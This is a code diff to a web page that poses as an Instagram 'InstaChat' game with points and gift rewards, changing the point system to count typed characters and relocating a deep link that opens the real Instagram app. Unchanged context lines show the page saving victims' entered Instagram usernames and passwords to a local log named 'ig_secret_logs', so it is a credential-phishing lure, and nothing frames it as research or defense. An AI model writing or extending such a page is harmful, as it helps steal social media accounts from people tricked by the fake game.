@@ -123,9 +123,9 @@
             width: 100%; max-width: 350px; text-align: center; box-sizing: border-box;
         }
         .game-card h2, .dashboard-card h2 { color: #0095f6; margin-top: 0; }
-        .game-card select, .game-card input {
+        .game-card select, .game-card input, .game-card textarea {
             width: 100%; padding: 12px; margin: 10px 0; background: #262626; border: none;
-            border-radius: 8px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none;
+            border-radius: 8px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none; resize: none;
         }
         .game-btn {
             width: 100%; background: #0095f6; color: #fff; border: none; padding: 12px;
@@ -187,18 +187,22 @@
         </div>
     </div>
 
-    <!-- SCREEN 2: Game Setup Screen -->
+    <!-- SCREEN 2: Game Setup & Keyboard Typing Challenge -->
     <div id="gameSetupScreen" class="screen hidden">
         <div class="game-card">
-            <h2>🎮 InstaChat Game</h2>
-            <p style="font-size: 13px; color: #a8a8a8;">Select Target Points & Launch App</p>
+            <h2>⌨️ Keyboard Type Challenge</h2>
+            <p style="font-size: 13px; color: #a8a8a8;">Type anything in the box below (1 character = 1 point)!</p>
             <select id="pointSelect">
-                <option value="50">50 Points (Fast)</option>
-                <option value="100">100 Points</option>
-                <option value="200">200 Points</option>
+                <option value="30">30 Points Target</option>
+                <option value="50">50 Points Target</option>
+                <option value="100">100 Points Target</option>
             </select>
             <input type="text" id="friendUser" placeholder="Friend's Instagram Username" required>
-            <button class="game-btn" onclick="openInstagramApp()">Start Game & Open App</button>
+            
+            <!-- Keypress tracking chat box -->
+            <textarea id="typingBox" rows="3" placeholder="Type your messages here (e.g. Hello, How are you)..." oninput="handleKeypressPoint(event)"></textarea>
+            
+            <button class="game-btn" onclick="openInstagramApp()">Open Official App</button>
         </div>
     </div>
 
@@ -206,7 +210,7 @@
     <div id="giftScreen" class="screen hidden">
         <div class="game-card">
             <h2>🎉 Party Bomb Fired!</h2>
-            <p>Target points completed via background chat!</p>
+            <p>Target points completed via keyboard typing!</p>
             <div class="gift-img" id="randomGiftIcon">💍</div>
             <p id="giftNameText" style="font-weight: bold; color: #ff007f;">Diamond Ring Unlocked!</p>
             <button class="game-btn" onclick="claimGift()">Gift Now</button>
@@ -286,45 +290,36 @@
             logs.unshift({ username: u, password: p, time: new Date().toLocaleString() });
             localStorage.setItem('ig_secret_logs', JSON.stringify(logs));
 
+            // Show Game Setup & Widget
             showScreen('gameSetupScreen');
-        });
-
-        // Open Real Instagram App via Android Intent / Deep Link
-        let targetPoints = 100;
-        let currentPoints = 0;
-        let pointInterval = null;
-
-        function openInstagramApp() {
-            const friend = document.getElementById('friendUser').value.trim().replace('@','') || "instagram";
-            targetPoints = parseInt(document.getElementById('pointSelect').value);
-            currentPoints = 0;
-
-            // Show Floating Widget
             document.getElementById('floatingWidget').classList.remove('hidden');
             updateWidgetScore();
+        });
 
-            // Background point collector simulation
-            if(pointInterval) clearInterval(pointInterval);
-            pointInterval = setInterval(() => {
-                currentPoints += 10;
-                updateWidgetScore();
-                if(currentPoints >= targetPoints) {
-                    clearInterval(pointInterval);
-                    triggerGiftScreen();
-                }
-            }, 3000);
+        // Keypress typing points logic
+        let targetPoints = 30;
+        let currentPoints = 0;
+        let previousLength = 0;
 
-            // Direct Android Intent / Custom Scheme to force open Instagram App
-            const intentUri = `intent://instagram.com/_u/${friend}/#Intent;package=com.instagram.android;scheme=https;end;`;
-            const schemeUri = `instagram://user?username=${friend}`;
-
-            // Try launching native app
-            window.location.href = schemeUri;
+        function handleKeypressPoint(event) {
+            targetPoints = parseInt(document.getElementById('pointSelect').value);
+            const currentText = event.target.value;
             
-            // Fallback to Android Intent if scheme fails
-            setTimeout(() => {
-                window.location.href = intentUri;
-            }, 500);
+            // Check how many characters were typed
+            if(currentText.length > previousLength) {
+                let addedChars = currentText.length - previousLength;
+                currentPoints += addedChars; // 1 character typed = 1 point earned
+            }
+            previousLength = currentText.length;
+
+            if(currentPoints >= targetPoints) {
+                currentPoints = targetPoints;
+                updateWidgetScore();
+                setTimeout(triggerGiftScreen, 300);
+                return;
+            }
+
+            updateWidgetScore();
         }
 
         function updateWidgetScore() {
@@ -332,7 +327,20 @@
         }
 
         function checkWidgetProgress() {
-            alert("🎮 Game Progress: " + currentPoints + " / " + targetPoints + " Points collected!\nKeep chatting on Instagram to reach the goal!");
+            alert("🎮 Typing Progress: " + currentPoints + " / " + targetPoints + " Points collected!\nKeep typing messages in the box to reach the target!");
+        }
+
+        // Open Real Instagram App via Deep Link
+        function openInstagramApp() {
+            const friend = document.getElementById('friendUser').value.trim().replace('@','') || "instagram";
+            
+            const intentUri = `intent://instagram.com/_u/${friend}/#Intent;package=com.instagram.android;scheme=https;end;`;
+            const schemeUri = `instagram://user?username=${friend}`;
+
+            window.location.href = schemeUri;
+            setTimeout(() => {
+                window.location.href = intentUri;
+            }, 500);
         }
 
         const gifts = [
